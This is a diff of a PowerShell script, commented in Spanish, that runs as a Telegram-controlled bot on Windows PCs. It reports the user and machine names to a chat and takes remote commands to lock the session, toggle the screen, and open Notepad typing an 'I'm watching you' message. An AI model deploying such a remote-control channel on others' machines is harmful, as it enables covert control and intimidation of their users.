@@ -8,24 +8,38 @@ $ChatID = "1018796719"                                    # REEMPLAZA CON TU CHA
 $URL    = "https://api.telegram.org/bot" + $Token
 $MiPC   = $env:COMPUTERNAME
 $User   = $env:USERNAME
-
+# ==============================================================================
+# NO BORRAR #############################################################
+# ==============================================================================
 # Registrar APIs de pantalla de Windows de forma segura
 try {
     $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
     Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
 } catch {}
 
+# Habilitar TLS 1.2
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# ==============================================================================
+# LIMPIAR HISTORIAL ANTES DE INICIAR (Evita bucles de bloqueo)
+# ==============================================================================
+$LastUpdateID = 0
+try {
+    $PreCheck = Invoke-RestMethod -Uri "$URL/getUpdates?timeout=1" -Method Get
+    if ($PreCheck.result.Count -gt 0) {
+        $LastUpdateID = $PreCheck.result[-1].update_id + 1
+        [void](Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=1" -Method Get)
+    }
+} catch {}
+
 # --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
 try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $MensajeInicio = "🚀 *PC En Línea:* `"$User@$MiPC`""
+    $MensajeInicio = "🚀 *PC En Línea y Protegida:* `"$User@$MiPC`""
     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio; parse_mode = "Markdown" })
 } catch {}
 
-$LastUpdateID = 0
-
 # ==============================================================================
-# BUCLE PRINCIPAL (Monitoreo de internet constante)
+# BUCLE PRINCIPAL DE MONITOREO SEGURO
 # ==============================================================================
 while ($true) {
     try {
@@ -38,16 +52,41 @@ while ($true) {
 
             if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                 
-                # Procesamiento seguro de comandos en minúsculas
+                # Procesamiento seguro de comandos
                 $Partes = $TextoRecibido -split " "
-                $Comando = $Partes[0].ToString().ToLower()
+                $Comando = ([string]$Partes[0]).ToLower()
                 
-                $Destino = "TODOS"
+                # Seguro anti-accidentes (Requiere obligatoriamente el nombre de la PC)
+                $Destino = ""
                 if ($Partes.Count -gt 1) {
-                    $Destino = $Partes[1].ToString().ToUpper()
+                    $Destino = ([string]$Partes[1]).ToUpper()
                 }
 
-                if ($Destino -eq $MiPC.ToUpper() -or $Destino -eq "TODOS") {
+                # --- COMANDO GLOBAL: /lista ---
+                if ($Comando -eq "/lista") {
+                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "👋 Reportándose desde Internet: $User@$MiPC" })
+                    continue
+                }
+
+                # --- COMANDO GLOBAL DE AYUDA: /codigo ---
+                if ($Comando -eq "/codigo") {
+                    # Aquí puedes redactar el texto de ayuda. Si agregas funciones en el futuro, editas este texto de abajo.
+                    $TextoAyuda = "📖 *PANEL DE COMANDOS DISPONIBLES*`n`n" +
+                                  "📌 *Comandos Globales:*`n" +
+                                  "• `/lista` - Muestra qué PCs están encendidas y sus nombres.`n" +
+                                  "• `/codigo` - Muestra este menú de ayuda.`n`n" +
+                                  "🔒 *Comandos Individuales (Requieren nombre de PC al final):*`n" +
+                                  "• `/pantalla_off [NombrePC]` - Bloquea la sesión y apaga la pantalla.`n" +
+                                  "• `/pantalla_on [NombrePC]` - Enciende la pantalla remota.`n" +
+                                  "• `/notepad [NombrePC]` - Abre el bloc de notas con un mensaje.`n`n" +
+                                  "💡 _Ejemplo de uso: /pantalla_off $MiPC_"
+                    
+                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda; parse_mode = "Markdown" })
+                    continue
+                }
+
+                # VALIDACIÓN CRÍTICA: Solo ejecuta funciones individuales si el destino coincide con ESTA PC
+                if ($Destino -eq $MiPC.ToUpper() -and $Destino -ne "") {
                     
                     switch ($Comando) {
                         "/pantalla_off" {
@@ -68,9 +107,6 @@ while ($true) {
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "✅ Bloc de notas abierto en $MiPC" })
                         }
-                        "/lista" {
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "👋 Reportándose desde Internet: $User@$MiPC" })
-                        }
                     }
                 }
             }
@@ -80,4 +116,3 @@ while ($true) {
     }
     Start-Sleep -Seconds 2
 }
-
